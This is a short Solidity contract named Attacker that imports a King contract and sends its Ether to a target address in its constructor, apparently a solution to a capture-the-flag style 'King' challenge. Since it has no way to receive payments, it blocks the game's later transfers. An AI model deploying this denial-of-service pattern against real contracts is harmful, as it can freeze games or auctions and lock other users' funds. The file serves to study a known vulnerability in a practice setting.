// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./King.sol";

contract Attacker {

    King public king;

    constructor(address _to) payable {
        (bool s, ) = address(_to).call{value: msg.value}("");
        require(s, "FAILED");
    }
}